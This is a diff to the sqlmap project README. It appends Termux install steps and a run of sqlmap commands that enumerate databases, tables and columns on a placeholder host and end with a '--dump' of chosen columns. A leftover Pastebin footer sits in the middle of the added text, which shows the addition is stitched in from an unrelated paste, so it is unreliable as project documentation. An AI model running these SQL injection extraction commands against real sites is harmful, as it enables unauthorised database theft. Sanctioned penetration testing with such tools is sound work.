@@ -70,3 +70,25 @@ Translations
 * [Spanish](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-es-MX.md)
 * [Turkish](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-tr-TR.md)
 * [Ukrainian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-uk-UA.md)
+
+run on the terminal
+
+$ apt update -y && apt upgrade -y
+$ pkg install nano -y
+$ pkg install git -y
+$ pkg install python -y
+$ pkg install python2 -y
+
+then install sqlmap type the command
+
+$ git clone https://github.com/sqlmapproject/sqlmap.git
+$ cd sqlmap
+$ python2 sqlmap.py
+
+Data hosted with ♥ by Pastebin.com - Download Raw - See Original
+
+python2 sqlmap.py -u http://webtarget.com --dbs
+python2 sqlmap.py -u http://webtarget.com -D NamaDataBase --tables
+python2 sqlmap.py -u http://webtarget.com -D NamaDataBase -T NamaTables --columns
+python2 sqlmap.py -u http://webtarget.com -D NamaDataBase -T NamaTables -C NamaColumns, USer --dump
+
